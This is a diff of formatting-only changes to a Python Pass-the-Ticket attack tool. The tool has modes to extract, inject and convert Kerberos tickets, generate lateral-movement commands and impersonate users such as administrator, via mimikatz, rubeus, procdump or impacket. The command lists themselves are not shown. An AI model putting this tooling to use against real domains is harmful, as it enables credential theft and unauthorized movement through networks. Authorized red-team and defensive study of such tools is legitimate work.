@@ -108,7 +108,9 @@ def generate_injection_commands(ticket_path: str, ticket_format: str = "kirbi") 
     return commands
 
 
-def generate_lateral_movement_commands(target: str, domain: str, username: str = "administrator") -> dict:
+def generate_lateral_movement_commands(
+    target: str, domain: str, username: str = "administrator"
+) -> dict:
     """Generate lateral movement commands using injected ticket."""
     commands = {
         "windows": [
@@ -146,7 +148,7 @@ def analyze_kirbi_ticket(ticket_path: str) -> dict | None:
         info = {
             "file": ticket_path,
             "size": len(data),
-            "format": "kirbi" if data[:2] in [b'\x76\x82', b'\x61\x82'] else "unknown",
+            "format": "kirbi" if data[:2] in [b"\x76\x82", b"\x61\x82"] else "unknown",
         }
 
         # Basic ASN.1 parsing - extract visible strings
@@ -197,16 +199,22 @@ def convert_ticket(input_path: str, output_path: str):
                     f.write(kirbi_data)
             console.print(f"[green][+] Converted {input_path} -> {output_path}[/green]")
         else:
-            console.print("[red][-] Unsupported conversion. Use .kirbi <-> .ccache[/red]")
+            console.print(
+                "[red][-] Unsupported conversion. Use .kirbi <-> .ccache[/red]"
+            )
 
     except ImportError:
         console.print("[yellow][!] Impacket not installed. Use manually:[/yellow]")
-        console.print(f"[cyan]impacket-ticketConverter {input_path} {output_path}[/cyan]")
+        console.print(
+            f"[cyan]impacket-ticketConverter {input_path} {output_path}[/cyan]"
+        )
     except Exception as e:
         console.print(f"[red][-] Conversion failed: {e}[/red]")
 
 
-def generate_report(target: str, domain: str, findings: list[dict] | None, output_path: str):
+def generate_report(
+    target: str, domain: str, findings: list[dict] | None, output_path: str
+):
     """Generate Pass-the-Ticket attack report."""
     report = f"""# Pass-the-Ticket Attack Report
 ## Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
@@ -268,27 +276,38 @@ were extracted from compromised hosts and used for lateral movement to target sy
 
 def main():
     parser = argparse.ArgumentParser(description="Pass-the-Ticket Attack Tool")
-    parser.add_argument("--mode", required=True,
-                        choices=["extract", "inject", "lateral", "convert", "analyze", "report"],
-                        help="Operation mode")
+    parser.add_argument(
+        "--mode",
+        required=True,
+        choices=["extract", "inject", "lateral", "convert", "analyze", "report"],
+        help="Operation mode",
+    )
     parser.add_argument("--target", help="Target host")
     parser.add_argument("--domain", default="domain.local", help="Domain name")
-    parser.add_argument("--username", default="administrator", help="Username to impersonate")
+    parser.add_argument(
+        "--username", default="administrator", help="Username to impersonate"
+    )
     parser.add_argument("--ticket", help="Path to ticket file")
     parser.add_argument("--input", help="Input file for conversion")
     parser.add_argument("--output", default="./ptt_report.md", help="Output path")
-    parser.add_argument("--method", default="all", choices=["all", "mimikatz", "rubeus", "procdump"],
-                        help="Extraction method")
+    parser.add_argument(
+        "--method",
+        default="all",
+        choices=["all", "mimikatz", "rubeus", "procdump"],
+        help="Extraction method",
+    )
 
     args = parser.parse_args()
 
     if args.mode == "extract":
         commands = generate_extraction_commands(args.target or "TARGET", args.method)
         for method, details in commands.items():
-            console.print(Panel(
-                "\n".join(details.get("commands", [])),
-                title=f"{method}: {details.get('description', '')}",
-            ))
+            console.print(
+                Panel(
+                    "\n".join(details.get("commands", [])),
+                    title=f"{method}: {details.get('description', '')}",
+                )
+            )
 
     elif args.mode == "inject":
         if not args.ticket:
@@ -305,7 +324,9 @@ def main():
             args.username,
         )
         for platform, cmds in commands.items():
-            console.print(Panel("\n".join(cmds), title=f"Lateral Movement - {platform}"))
+            console.print(
+                Panel("\n".join(cmds), title=f"Lateral Movement - {platform}")
+            )
 
     elif args.mode == "convert":
         if not args.input or not args.output:
